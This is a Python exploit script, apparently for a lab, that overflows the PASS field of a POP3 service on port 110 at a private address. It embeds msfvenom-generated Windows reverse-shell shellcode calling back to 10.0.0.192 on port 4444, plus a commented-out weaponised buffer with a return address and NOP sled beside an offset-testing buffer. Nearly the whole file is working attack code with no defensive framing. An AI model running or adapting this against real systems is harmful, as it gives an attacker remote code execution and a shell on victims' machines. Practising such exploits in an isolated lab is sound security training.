import socket

ip = '10.0.0.209'
port = 110

# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.192 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d" -e "x86/shikata_ga_nai" -f c
shellcode = ("\xd9\xc2\xd9\x74\x24\xf4\x58\xbe\xab\xb0\x1e\x91\x31\xc9\xb1"
"\x52\x31\x70\x17\x03\x70\x17\x83\x6b\xb4\xfc\x64\x97\x5d\x82"
"\x87\x67\x9e\xe3\x0e\x82\xaf\x23\x74\xc7\x80\x93\xfe\x85\x2c"
"\x5f\x52\x3d\xa6\x2d\x7b\x32\x0f\x9b\x5d\x7d\x90\xb0\x9e\x1c"
"\x12\xcb\xf2\xfe\x2b\x04\x07\xff\x6c\x79\xea\xad\x25\xf5\x59"
"\x41\x41\x43\x62\xea\x19\x45\xe2\x0f\xe9\x64\xc3\x9e\x61\x3f"
"\xc3\x21\xa5\x4b\x4a\x39\xaa\x76\x04\xb2\x18\x0c\x97\x12\x51"
"\xed\x34\x5b\x5d\x1c\x44\x9c\x5a\xff\x33\xd4\x98\x82\x43\x23"
"\xe2\x58\xc1\xb7\x44\x2a\x71\x13\x74\xff\xe4\xd0\x7a\xb4\x63"
"\xbe\x9e\x4b\xa7\xb5\x9b\xc0\x46\x19\x2a\x92\x6c\xbd\x76\x40"
"\x0c\xe4\xd2\x27\x31\xf6\xbc\x98\x97\x7d\x50\xcc\xa5\xdc\x3d"
"\x21\x84\xde\xbd\x2d\x9f\xad\x8f\xf2\x0b\x39\xbc\x7b\x92\xbe"
"\xc3\x51\x62\x50\x3a\x5a\x93\x79\xf9\x0e\xc3\x11\x28\x2f\x88"
"\xe1\xd5\xfa\x1f\xb1\x79\x55\xe0\x61\x3a\x05\x88\x6b\xb5\x7a"
"\xa8\x94\x1f\x13\x43\x6f\xc8\x16\x94\x6f\xc8\x4f\x96\x6f\xd9"
"\xd3\x1f\x89\xb3\xfb\x49\x02\x2c\x65\xd0\xd8\xcd\x6a\xce\xa5"
"\xce\xe1\xfd\x5a\x80\x01\x8b\x48\x75\xe2\xc6\x32\xd0\xfd\xfc"
"\x5a\xbe\x6c\x9b\x9a\xc9\x8c\x34\xcd\x9e\x63\x4d\x9b\x32\xdd"
"\xe7\xb9\xce\xbb\xc0\x79\x15\x78\xce\x80\xd8\xc4\xf4\x92\x24"
"\xc4\xb0\xc6\xf8\x93\x6e\xb0\xbe\x4d\xc1\x6a\x69\x21\x8b\xfa"
"\xec\x09\x0c\x7c\xf1\x47\xfa\x60\x40\x3e\xbb\x9f\x6d\xd6\x4b"
"\xd8\x93\x46\xb3\x33\x10\x66\x56\x91\x6d\x0f\xcf\x70\xcc\x52"
"\xf0\xaf\x13\x6b\x73\x45\xec\x88\x6b\x2c\xe9\xd5\x2b\xdd\x83"
"\x46\xde\xe1\x30\x66\xcb")

buffer = 'A' * 2606 + 'B' * 4 + 'C' * (3500 - 2606 - 4)
# buffer = 'A' * 2606 + '\x8f\x35\x4a\x5f' + '\x90' * 16 + shellcode + 'C' * (3500 - 2606 - 4 - 16 - len(shellcode)) 

try:
	print('[*] Creating Connection')
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.connect((ip,port))
	s.recv(1024)

	print('[*] Sending user name')
	s.send('USER doink\r\n')
	s.recv(1024)

	print('[*] Sending payload')
	s.send('PASS ' + buffer + '\r\n')
	s.recv(1024)

	s.close()

except KeyboardInterrupt:
	print('\n[*] Stopping')

except:
	print('[-] There was an unexpected error')
